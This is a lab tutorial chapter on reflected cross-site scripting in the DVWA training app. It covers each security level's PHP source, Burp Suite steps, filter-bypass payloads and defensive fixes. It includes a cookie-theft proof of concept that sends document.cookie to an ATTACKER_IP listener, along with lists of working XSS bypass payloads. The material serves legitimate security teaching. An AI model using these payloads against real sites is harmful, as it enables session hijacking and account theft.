# Chapter 10 — XSS Reflected (DVWA Module: XSS (Reflected))

## Objective
Inject JavaScript that reflects immediately in the server's response (non-persistent), demonstrating session cookie theft via Burp-hosted payloads.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/xss_r/?name=test`

---

## 🟢 LOW

### Source logic
```php
echo 'Hello ' . $_GET[ 'name' ] . '';
```
Direct, unescaped output of user input into HTML.

### Burp Suite steps
1. Capture `GET /vulnerabilities/xss_r/?name=test`, send to Repeater.
2. Test payload:
   ```
   name=<script>alert(document.cookie)</script>
   ```
3. Response body contains the raw `<script>` tag verbatim — confirms reflected XSS (also verify by loading the URL directly in the proxied browser to see the alert fire).
4. **Cookie exfiltration PoC** (host a listener):
   ```bash
   python3 -m http.server 9000
   ```
   ```
   name=<script>new Image().src='http://ATTACKER_IP:9000/steal?c='+document.cookie</script>
   ```
   Send this URL to a "victim" (in your own lab browser) — the request log on your listener captures their `PHPSESSID`.

### Why it works
No output encoding — the browser interprets the reflected `<script>` tag as executable HTML/JS because it's placed directly into the HTML response without escaping special characters (`<`, `>`, `"`, `'`).

---

## 🟡 MEDIUM

### Source logic
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
echo 'Hello ' . $name . '';
```
Blacklists the literal string `<script>` only.

### Burp Suite bypass payloads
```
name=<sCrIpT>alert(1)</sCrIpT>                     (case variation — str_replace is case-sensitive)
name=<scr<script>ipt>alert(1)</scr</script>ipt>    (nested tag trick — removes inner match, reforms outer)
name=<img src=x onerror=alert(1)>                  (non-<script> vector entirely)
name=<svg onload=alert(1)>
name=<body onload=alert(1)>
```

### Why the bypass works
Blacklisting one exact string/tag ignores the vast number of alternative XSS vectors (event handler attributes, other tags, case variation, nested-tag reconstruction). HTML/JS injection has too many syntactic forms for a single-string blacklist to cover.

---

## 🔴 HIGH

### Source logic
```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
echo 'Hello ' . $name . '';
```
Regex attempts to catch obfuscated variants of the word "script" (with characters interspersed via `.*`), still targeting `<script>` conceptually.

### Burp Suite bypass
Since the regex only removes `script`-like patterns, any non-script vector still works:
```
name=<img src=x onerror=alert(1)>
name=<svg/onload=alert(1)>
name=<iframe src=javascript:alert(1)>
name=<body onload=alert(document.cookie)>
name="><script>alert(1)</script>   (breaks out of an attribute context if reflected inside one elsewhere)
```

### Why it's still risky
The filter is tightly scoped to one keyword/tag pattern; it does not address the *fundamental issue* — unescaped output — so any payload avoiding the literal word "script" bypasses it entirely.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$name = htmlspecialchars( $_GET[ 'name' ], ENT_QUOTES );
echo 'Hello ' . $name . '';
// Plus a CSRF token requirement on the form
```

### Why the attack fails
`htmlspecialchars()` with `ENT_QUOTES` converts `<`, `>`, `"`, `'`, and `&` into their HTML entity equivalents (`&lt;`, `&gt;`, `&quot;`, `&#039;`, `&amp;`). The browser renders these as **literal text**, not HTML/JS markup — there is no longer any character sequence that can break out of the text context to inject a tag or attribute.

### Burp Suite exercise
Send every payload from Low/Medium/High — the response shows the payload printed as harmless visible text (e.g., `&lt;script&gt;alert(1)&lt;/script&gt;`), no JavaScript executes.

---

## Root Cause Analysis
Reflected XSS results from untrusted input being echoed into an HTML response without **context-aware output encoding**. Blacklists targeting specific tags/keywords are inherently incomplete due to HTML's many injection vectors (tags, attributes, event handlers, URIs, CSS). Proper encoding at the point of output is the only complete fix.

## Defensive Takeaways
- Encode all output using context-appropriate functions: `htmlspecialchars()` for HTML body, attribute-encoding for attribute values, JS-string-escaping for inline scripts.
- Prefer templating engines with **auto-escaping by default** (e.g., Twig, Blade, React JSX) over manual `echo`.
- Set a strong **Content-Security-Policy** header as defense-in-depth (see Chapter 13).
- Set `HttpOnly` on session cookies so even a successful XSS can't read them via `document.cookie`.

---
⬅ [Back: Weak Session IDs](09-weak-session-ids.md) | ➡ [Next: XSS Stored](11-xss-stored.md)
